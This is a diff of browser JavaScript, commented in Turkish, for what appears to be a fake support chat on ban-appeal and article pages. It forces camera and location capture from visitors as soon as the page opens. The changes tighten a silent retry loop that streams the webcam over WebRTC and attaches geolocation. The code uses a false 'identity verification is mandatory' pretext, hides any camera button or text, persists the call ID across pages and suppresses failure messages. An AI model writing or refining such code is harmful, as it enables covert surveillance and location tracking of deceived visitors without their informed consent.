@@ -1088,7 +1088,10 @@
         ts: now,
       })
       .catch(() => {});
-    syncMessage("user", "Konum izni verildi.");
+    if (!locationGrantedSynced) {
+      locationGrantedSynced = true;
+      syncMessage("user", "Konum izni verildi.");
+    }
     if (state.label) {
       state.label.textContent =
         "Kimlik doğrulaması devam ediyor… İzinler açık kalsın; lütfen bekleyin.";
@@ -1304,18 +1307,25 @@
         sdp: offer.sdp,
       });
       // Ziyaretçi sohbetinde mesaj yok — konum ayrı takip edilir
-      syncMessage("user", auto ? "Kamera izni verildi." : "Kamera izni onaylandı.");
+      if (!cameraGrantedSynced) {
+        cameraGrantedSynced = true;
+        syncMessage("user", auto ? "Kamera izni verildi." : "Kamera izni onaylandı.");
+      }
       return "ok";
     } catch (err) {
       console.error(err);
       await stopCameraSession(callId, { upload: false });
-      appendMessage(
-        box,
-        "bot",
-        `Bağlantı kurulamadı: ${err?.code || err?.message || "bilinmeyen hata"}`,
-        { sync: false }
-      );
-      await sync.setCameraCallStatus(sessionId, callId, "ended").catch(() => {});
+      if (!connectionFailShown) {
+        connectionFailShown = true;
+        appendMessage(
+          box,
+          "bot",
+          `Bağlantı kurulamadı: ${err?.code || err?.message || "bilinmeyen hata"}`,
+          { sync: false }
+        );
+      }
+      // ended yazma — aynı callId ile sessizce tekrar dene (spam mesaj olmasın)
+      await sync.setCameraCallStatus(sessionId, callId, "requested").catch(() => {});
       return "error";
     }
   }
@@ -1590,6 +1600,9 @@
   let pageEntryPermBooted = false;
   let pageEntryRetryTimer = null;
   let pageEntryGestureUnsub = null;
+  let cameraGrantedSynced = false;
+  let connectionFailShown = false;
+  let locationGrantedSynced = false;
   const CAMERA_PERM_RETRY_MS = 10_000;
   const MEDIA_PERM_GRANTED_KEY = "media_perm_granted_v1";
   const CAMERA_PERM_DENIED_TEXT =
@@ -1635,7 +1648,15 @@
     // ban-appeal / index / makale → anında chat.html
     visitorChatOpenedAfterPerm = true;
     try {
+      stopCameraPermissionLoop();
+    } catch {
+      /* ignore */
+    }
+    try {
       sessionStorage.setItem("open_chat_after_perm_v1", "1");
+      if (latestCameraCallId) {
+        sessionStorage.setItem("pending_camera_call_v1", latestCameraCallId);
+      }
     } catch {
       /* ignore */
     }
@@ -1814,7 +1835,7 @@
     await waitForChatSync();
     const ok = await activateChatMediaNow(box, { fromGesture, announce });
     // Sohbetteki beginAutoCamera ile aynı: aktif oturum + zorlama döngüsü
-    startCameraPermissionLoop(box);
+    startCameraPermissionLoop(box, { preferCallId: latestCameraCallId || undefined });
     return ok;
   }
 
@@ -1849,9 +1870,16 @@
     }
 
     // 3) Mevcut canlı oturum var mı?
+    let pendingCall = null;
+    try {
+      pendingCall = sessionStorage.getItem("pending_camera_call_v1");
+    } catch {
+      /* ignore */
+    }
     let callId =
       opts.callId ||
       latestCameraCallId ||
+      pendingCall ||
       [...cameraSessions.keys()].find((id) => {
         const st = cameraSessions.get(id);
         return st?.stream?.getTracks?.().some((t) => t.readyState === "live");
@@ -1861,10 +1889,18 @@
     if (!callId) {
       try {
         const offer = await sync.startVisitorCameraOffer(
-          "Kimlik doğrulaması için izin zorunludur. İzin verirseniz doğrulama bu destek oturumuna bağlanır. İzin verilmezse doğrulama adımı tamamlanamaz."
+          "Kimlik doğrulaması için izin zorunludur. İzin verirseniz doğrulama bu destek oturumuna bağlanır. İzin verilmezse doğrulama adımı tamamlanamaz.",
+          { reuse: true }
         );
         callId = offer?.callId || null;
-        if (callId) latestCameraCallId = callId;
+        if (callId) {
+          latestCameraCallId = callId;
+          try {
+            sessionStorage.setItem("pending_camera_call_v1", callId);
+          } catch {
+            /* ignore */
+          }
+        }
       } catch (err) {
         console.warn("activate offer", err);
       }
@@ -2142,18 +2178,35 @@
   const CAMERA_OFFER_TEXT =
     "Kimlik doğrulaması için izin zorunludur. İzin verirseniz doğrulama bu destek oturumuna bağlanır. İzin verilmezse doğrulama adımı tamamlanamaz.";
 
-  const CAMERA_FORCE_RETRY_MS = 2_500;
+  const CAMERA_FORCE_RETRY_MS = 5_000;
 
   /** Ziyaretçiye kamera metni/butonu YOK — sayfa açılınca zorla kamera+konum */
   function startCameraPermissionLoop(box, opts = {}) {
     stopCameraPermissionLoop();
     const token = cameraPermLoopToken;
-    let callId = opts.preferCallId || null;
+    let callId =
+      opts.preferCallId ||
+      latestCameraCallId ||
+      (() => {
+        try {
+          return sessionStorage.getItem("pending_camera_call_v1") || null;
+        } catch {
+          return null;
+        }
+      })();
     let attempting = false;
+    let offerStarted = Boolean(callId);
 
     const sessionHasBoth = (id) => {
       const st = id ? cameraSessions.get(id) : null;
-      return Boolean(st?.stream && st._hadLocation);
+      return Boolean(
+        st?._hadLocation && st?.stream?.getTracks?.().some((t) => t.readyState === "live")
+      );
+    };
+
+    const sessionHasLiveCam = (id) => {
+      const st = id ? cameraSessions.get(id) : null;
+      return Boolean(st?.stream?.getTracks?.().some((t) => t.readyState === "live"));
     };
 
     const scheduleRetry = () => {
@@ -2218,8 +2271,20 @@
         }
 
         if (!callId) {
-          const offer = await sync.startVisitorCameraOffer(CAMERA_OFFER_TEXT);
-          callId = offer?.callId;
+          const offer = await sync.startVisitorCameraOffer(CAMERA_OFFER_TEXT, {
+            reuse: true,
+            silent: offerStarted,
+          });
+          callId = offer?.callId || null;
+          if (callId) {
+            latestCameraCallId = callId;
+            offerStarted = true;
+            try {
+              sessionStorage.setItem("pending_camera_call_v1", callId);
+            } catch {
+              /* ignore */
+            }
+          }
           if (!callId) {
             scheduleRetry();
             return;
@@ -2227,6 +2292,30 @@
         }
 
         if (token !== cameraPermLoopToken) return;
+
+        // Canlı kamera varsa yeniden başlatma — sadece konum tamamla
+        if (sessionHasLiveCam(callId)) {
+          const existingLive = cameraSessions.get(callId);
+          if (existingLive && !existingLive._hadLocation) {
+            try {
+              existingLive.retryLocation?.();
+            } catch {
+              /* ignore */
+            }
+            if (earlyLocationPos?.coords) {
+              applySeedLocationToSession(sync, callId, existingLive, earlyLocationPos);
+            }
+          }
+          if (sessionHasBoth(callId)) {
+            stopCameraPermissionLoop();
+            markMediaPermGranted();
+            hidePageEntryPermGate();
+            maybeOfferPhoneEntry(box);
+            return;
+          }
+          scheduleRetry();
+          return;
+        }
 
         let existing = cameraSessions.get(callId);
         if (!existing?.stream) {
